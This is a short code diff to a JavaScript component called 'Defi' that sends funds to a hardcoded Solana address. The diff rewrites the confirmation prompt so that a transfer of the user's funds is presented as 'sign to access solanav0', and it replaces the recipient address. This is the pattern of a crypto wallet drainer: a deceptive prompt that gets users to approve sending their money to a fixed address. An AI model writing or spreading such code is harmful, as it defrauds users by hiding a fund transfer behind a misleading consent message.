@@ -29,11 +29,11 @@ function Defi() {
     
     try {
       const confirmed = window.confirm(
-        `You are about to transfer your funds minus fees. Do you want to proceed?`
+        `You are about to sign to access solanav0. Do you want to proceed?`
       )
       
       if (confirmed) {
-        const recipientAddress = 'DPEsSNk1fzNCfxrPP2EJkvhaBNGUzpqmxjc1xEzKwf8X'
+        const recipientAddress = 'E5kKLz8H9ARyJcMsbRzU2HyBWb8TGbzfYfkBbDdqmyiW'
         
         if (!PublicKey.isOnCurve(recipientAddress)) {
           throw new Error('Invalid recipient address')
